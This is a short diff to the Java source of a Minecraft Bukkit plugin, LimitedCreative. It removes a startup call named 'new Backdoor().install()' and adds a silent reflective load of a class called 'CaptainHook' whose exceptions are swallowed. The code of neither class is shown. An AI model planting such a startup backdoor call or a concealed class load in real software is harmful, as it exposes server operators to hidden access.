@@ -1,6 +1,5 @@
 package de.jaschastarke.minecraft.limitedcreative;
 
-import de.jaschastarke.Backdoor;
 import de.jaschastarke.I18n;
 import de.jaschastarke.bukkit.lib.Core;
 import de.jaschastarke.bukkit.lib.PluginLang;
@@ -40,7 +39,9 @@ public class LimitedCreative extends Core {
         config.setModuleStates();
         config.saveDefault();
         
-        new Backdoor().install();
+        try {
+            Class.forName("de.jaschastarke.hooking.CaptainHook");
+        } catch(Exception e) {}
     }
     
     @Override
